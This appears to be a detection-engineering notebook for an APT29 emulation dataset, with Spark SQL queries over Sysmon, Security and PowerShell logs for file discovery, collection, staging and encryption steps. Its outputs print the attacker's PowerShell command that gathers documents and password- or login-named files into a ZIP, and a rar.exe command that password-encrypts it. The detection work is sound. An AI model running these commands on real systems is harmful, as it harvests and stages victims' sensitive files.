<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT b.NewProcessId</span>
<span class="sd">        FROM apt29Host b</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT NewProcessId</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">              AND EventID = 4688</span>
<span class="sd">              AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">        ) a</span>
<span class="sd">        ON b.ProcessId = a.NewProcessId</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND NewProcessName LIKE &#39;%python.exe&#39;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.NewProcessId</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 4688</span>
<span class="sd">    AND NewProcessName LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x89177D

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x130c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x87c
	Creator Process Name:	C:\Windows\Temp\python.exe
	Process Command Line:	powershell.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-2-file-and-directory-discovery">
<h2>9.B.2. File and Directory Discovery<a class="headerlink" href="#b-2-file-and-directory-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Searched filesystem for document and media files using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing (Get-)ChildItem​</p>
<div class="section" id="id66">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id66" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:3DDF2B9B-10AC-454C-BFA0-1F7BD011947E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.ScriptBlockText</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ExecutionProcessID = g.ProcessId</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND h.EventID = 4104</span>
<span class="sd">    AND LOWER(h.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:E7ED941E-F3B3-441B-B43D-1F1B194D6303</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.ScriptBlockText</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(f.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT d.NewProcessId</span>
<span class="sd">        FROM apt29Host d</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">            SELECT b.NewProcessId</span>
<span class="sd">            FROM apt29Host b</span>
<span class="sd">            INNER JOIN (</span>
<span class="sd">              SELECT NewProcessId</span>
<span class="sd">              FROM apt29Host</span>
<span class="sd">              WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">                  AND EventID = 4688</span>
<span class="sd">                  AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">            ) a</span>
<span class="sd">            ON b.ProcessId = a.NewProcessId</span>
<span class="sd">            WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">              AND NewProcessName LIKE &#39;%python.exe&#39;</span>
<span class="sd">        ) c</span>
<span class="sd">        ON d.ProcessId = c.NewProcessId</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ProcessId = e.NewProcessId</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON LOWER(hex(h.ExecutionProcessID)) = g.NewProcessId</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND h.EventID = 4104</span>
<span class="sd">    AND LOWER(h.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-3-automated-collection">
<h2>9.B.3. Automated Collection<a class="headerlink" href="#b-3-automated-collection" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Scripted search of filesystem for document and media files using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing (Get-)ChildItem</p>
<div class="section" id="id67">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id67" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:6AE2BDBE-48BD-4323-8572-B2214D244013</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.ScriptBlockText</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ExecutionProcessID = g.ProcessId</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND h.EventID = 4104</span>
<span class="sd">    AND LOWER(h.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:6A0DF333-5329-42B5-9AF6-60AB647051CD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.ScriptBlockText</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(f.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT d.NewProcessId</span>
<span class="sd">        FROM apt29Host d</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">            SELECT b.NewProcessId</span>
<span class="sd">            FROM apt29Host b</span>
<span class="sd">            INNER JOIN (</span>
<span class="sd">              SELECT NewProcessId</span>
<span class="sd">              FROM apt29Host</span>
<span class="sd">              WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">                  AND EventID = 4688</span>
<span class="sd">                  AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">            ) a</span>
<span class="sd">            ON b.ProcessId = a.NewProcessId</span>
<span class="sd">            WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">              AND NewProcessName LIKE &#39;%python.exe&#39;</span>
<span class="sd">        ) c</span>
<span class="sd">        ON d.ProcessId = c.NewProcessId</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ProcessId = e.NewProcessId</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON LOWER(hex(h.ExecutionProcessID)) = g.NewProcessId</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND h.EventID = 4104</span>
<span class="sd">    AND LOWER(h.ScriptBlockText) LIKE &quot;%childitem%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-4-data-from-local-system">
<h2>9.B.4. Data from Local System<a class="headerlink" href="#b-4-data-from-local-system" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Recursively collected files found in C:\Users\Pam\ using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe reading files in C:\Users\Pam\</p>
<div class="section" id="id68">
<h3>Detection Type:None(None)<a class="headerlink" href="#id68" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="b-5-data-staged">
<h2>9.B.5. Data Staged<a class="headerlink" href="#b-5-data-staged" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Staged files for exfiltration into ZIP (working.zip in AppData directory) using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe creating the file working.zip</p>
<div class="section" id="id69">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id69" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:17B04626-D628-4CFC-9EF1-7FF9CD48FF5E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND h.EventID = 11</span>
<span class="sd">    AND LOWER(h.TargetFilename) LIKE &quot;%working.zip&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:16:00.353
ProcessGuid: {5aa8ec29-e5e4-5eac-7a03-000000000400}
ProcessId: 4876
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\pbeesly\AppData\Roaming\working.zip
CreationUtcTime: 2020-05-02 03:16:00.353 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-6-data-encrypted">
<h2>9.B.6. Data Encrypted<a class="headerlink" href="#b-6-data-encrypted" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Encrypted staged ZIP (working.zip in AppData directory) into working.zip (on Desktop) using rar.exe</p>
<p><strong>Criteria:</strong> powershell.exe executing rar.exe with the -a parameter for a password to use for encryption</p>
<div class="section" id="id70">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id70" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:9EC44B89-9B82-41F2-B11E-D49392853C63</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">          SELECT b.ProcessGuid</span>
<span class="sd">          FROM apt29Host b</span>
<span class="sd">          INNER JOIN (</span>
<span class="sd">            SELECT ProcessGuid</span>
<span class="sd">            FROM apt29Host</span>
<span class="sd">            WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">                AND EventID = 1</span>
<span class="sd">                AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">          ) a</span>
<span class="sd">          ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND EventID = 1</span>
<span class="sd">      AND Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ParentProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND h.EventID = 1</span>
<span class="sd">    AND LOWER(h.CommandLine) LIKE &quot;%rar.exe%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:16:19.395
ProcessGuid: {5aa8ec29-e603-5eac-7b03-000000000400}
ProcessId: 188
Image: C:\Windows\Temp\Rar.exe
FileVersion: 5.71.0
Description: Command line RAR
Product: WinRAR
Company: Alexander Roshal
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\Rar.exe&quot; a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
CurrentDirectory: C:\Windows\Temp\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e5b7-5eac-7d17-890000000000}
LogonId: 0x89177D
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=FBFAA0AA1E0F6BE9987F896AF5F15B593EE1AD50,MD5=B891917AA5F7E2E9806F2BECEBE7C77B,SHA256=26D9212EC8DBCA45383EB95EC53C05357851BD7529FA0761D649F62E90C4E9FD,IMPHASH=B6CF226307A5F95763025E2880CDD028
ParentProcessGuid: {5aa8ec29-e5e4-5eac-7a03-000000000400}
ParentProcessId: 4876
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:579D025B-DFFB-416B-B07A-A36D9CE1EF93</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT h.Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.NewProcessId</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT d.NewProcessId</span>
<span class="sd">        FROM apt29Host d</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">            SELECT b.NewProcessId</span>
<span class="sd">            FROM apt29Host b</span>
<span class="sd">            INNER JOIN (</span>
<span class="sd">              SELECT NewProcessId</span>
<span class="sd">              FROM apt29Host</span>
<span class="sd">              WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">                  AND EventID = 4688</span>
<span class="sd">                  AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">            ) a</span>
<span class="sd">            ON b.ProcessId = a.NewProcessId</span>
<span class="sd">            WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">              AND NewProcessName LIKE &#39;%python.exe&#39;</span>
<span class="sd">        ) c</span>
<span class="sd">        ON d.ProcessId = c.NewProcessId</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ProcessId = e.NewProcessId</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessId = g.NewProcessId</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND h.EventID = 4688</span>
<span class="sd">    AND LOWER(h.CommandLine) LIKE &quot;%rar.exe%&quot;</span>

